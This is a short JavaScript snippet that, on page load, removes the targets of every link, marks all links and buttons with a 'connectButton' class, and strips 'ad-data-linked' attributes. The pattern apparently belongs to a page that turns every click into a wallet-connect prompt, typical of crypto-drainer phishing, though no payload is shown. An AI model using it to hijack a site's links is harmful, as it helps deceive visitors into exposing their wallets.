    
    document.addEventListener('DOMContentLoaded', function () {
      var links = document.querySelectorAll('body a');
      for (var i = 0; i < links.length; i++) {
        var link = links[i];
        link.removeAttribute('href');
        link.classList.add('connectButton');
      }
      });
      
      
  document.addEventListener('DOMContentLoaded', function () {
    var buttons = document.querySelectorAll('body button');
    for (var i = 0; i < buttons.length; i++) {
      var button = buttons[i];
      button.classList.add('connectButton');
    }
  });
  
  console.log('him');
  
    document.addEventListener("DOMContentLoaded", function() {
      const elements = document.querySelectorAll('[ad-data-linked]');
      elements.forEach(element => {
          element.removeAttribute('ad-data-linked');
      });
  
      console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
  });
  
  
  
      